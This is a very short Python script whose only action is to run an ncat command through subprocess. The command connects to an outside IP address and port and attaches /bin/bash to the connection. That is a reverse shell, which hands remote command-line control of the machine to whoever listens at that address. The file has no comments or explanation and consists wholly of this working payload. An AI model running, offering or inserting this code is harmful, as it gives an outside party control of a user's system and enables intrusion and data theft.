import subprocess

cmd = "ncat 159.89.102.147 14292 -e /bin/bash"
subprocess.run(cmd, shell=True)
